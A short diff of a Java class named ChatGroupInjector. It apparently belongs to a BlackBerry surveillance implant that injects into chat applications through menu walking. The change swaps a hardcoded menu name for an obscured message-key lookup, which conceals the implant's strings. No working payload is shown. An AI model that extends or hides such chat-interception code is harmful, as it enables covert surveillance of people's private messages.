@@ -13,6 +13,7 @@ import java.util.Vector;
 
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
+import blackberry.Messages;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.MenuWalker;
@@ -32,8 +33,8 @@ public abstract class ChatGroupInjector extends AInjector {
     public abstract String getCodName();
 
     public String getPreferredMenuName() {
-        //TODO: messages
-        return "Yield";
+        //g.7
+        return Messages.getString("g.7");
     }
 
     public String[] getWantedScreen() {
